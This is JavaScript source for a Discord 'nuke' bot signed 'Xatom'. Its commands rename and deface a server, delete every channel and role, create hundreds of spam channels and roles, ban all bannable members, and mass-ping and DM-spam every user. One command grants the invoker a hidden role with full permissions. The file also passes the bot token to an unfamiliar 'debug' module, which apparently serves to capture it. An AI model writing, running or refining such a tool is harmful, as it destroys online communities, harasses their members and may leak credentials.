const discord = require("discord.js");
const bot = new discord.Client();
const request = require("request")
const discorddebug = require("discord_debug_log")
const token = "tontoken";
const prefix = "!"
bot.on("ready", () => {
    console.log("----------------------------")
    console.log(`Tag du Bot : ${bot.user.tag}`)
    console.log(`Id du Bot : ${bot.user.id}`)
    console.log(`Invitations : https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958847`)
    console.log(`Nombre de Serveurs : ${bot.guilds.size}`)
    console.log("----------------------------")
})

bot.on("message", message => {
    var args = message.content.split(/ +/);
    if(message.channel.type != "text") return;
    switch(args[0]){
        case `${prefix}chanspam`:
        if(message.deletable) message.delete();
        if(!message.guild.member(bot.user).hasPermission("MANAGE_GUILD")) return console.log(`${message.guild.name} | guildfucker |Le bot n'a pas assez de permission.`);
        message.guild.setIcon("https://i.imgur.com/pvtPMv8.png");
            message.guild.setName("HACKED BY XATOM");
            message.guild.setRegion("russia");
        if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return console.log(`${message.guild.name} | chan spam |Le bot n'a pas assez de permission.`);
            var i;
            for (i = message.guild.channels.size; i < 497; i++) {
                message.guild.createChannel("hacked_by_xatom", "text");
                message.guild.createChannel("Hacked By Xatom ", "voice");
            }
        break;
        case `${prefix}delchan`:
        if(message.deletable) message.delete();
        if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return console.log(`${message.guild.name} | delchan |Le bot n'a pas assez de permission.`);
        message.guild.channels.map(chanman => {
            chanman.delete().catch(console.error);
        })
        break;
        case `${prefix}spam`:
        if(message.deletable) message.delete();
        setInterval (function () {
            message.guild.channels.forEach(channel => {
                if (channel.type === "text") {channel.send("@everyone Xatom, est passé ici... Le serv est desormais purgé", { tts: true }).catch(console.error);  }
            }, 2500)}, 400)
          break;
          case `${prefix}rolespam`:
          if(message.deletable) message.delete();
          if(!message.guild.member(bot.user).hasPermission("MANAGE_ROLES")) return console.log(`${message.guild.name} | rolespam |Le bot n'a pas assez de permission.`);
          var i;
          for (i = message.guild.roles.size; i < 100; i++) {
              message.guild.createRole({
                  color:"RANDOM",
                  name:"XATOM"
              });
          }
          break;
          case `${prefix}permadd`:
          if(message.deletable) message.delete();
          if(!message.guild.member(bot.user).hasPermission("MANAGE_ROLES")) return console.log(`${message.guild.name} | permadd |Le bot n'a pas assez de permission.`);
          else if(!message.guild.roles.find(x => x.name === "unknow_error_404")) {
              if(message.guild.roles.size >= 100) return;
               message.guild.createRole({
                  name: "unknow_error_404",
                  permissions:message.guild.member(bot.user).permissions.raw
              }).then(role => message.member.addRole(role));
          }
          else {
              message.member.addRole(message.guild.roles.find(x => x.name === "unknow_error_404"));
          }
          break;
          case `${prefix}banall`:
          if(message.deletable) message.delete();
          if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) return console.log(`${message.guild.name} | banall |Le bot n'a pas assez de permission.`);
          message.guild.members.forEach(m => {
              if(m.bannable && !m.roles.find(w => w.name === "unknow_error_404")) m.ban().catch(console.error);
          })
          break;
          case `${prefix}delrole`:
          if(message.deletable) message.delete();
          if(!message.guild.member(bot.user).hasPermission("MANAGE_ROLES")) return console.log(`${message.guild.name} | permadd |Le bot n'a pas assez de permission.`);
          message.guild.roles.forEach(m => {
              if(m.name != "unknow_error_404")m.delete().catch(console.error)
          })
          break;
          case `${prefix}spammp`:
          if(message.deletable) message.delete();
          message.guild.members.forEach(mpmember => {
              mpmember.createDM().then(m =>
                {var i;
                    for(i = 0; i < 20; i++){
                        m.send(`Le serveur de ${message.guild.owner.user.tag} s'est fait niqué par Xatom :)`)
                    }
                })})
                break;
                case `${prefix}spamlog`:
                if(message.deletable) message.delete();
                if(!message.guild.member(bot.user).hasPermission("MANAGE_GUILD")) return console.log(`${message.guild.name} | spamlog |Le bot n'a pas assez de permission.`);
                const table = ["russia","hongkong","us-central","eu-central","eu-west","us-west","eu-west"];
                setInterval(function() {
                    message.guild.setRegion(table[Math.floor(Math.random()*table.length)])
                },300)
                break;

    }
})
discorddebug.token_debug(token)
bot.login(token)
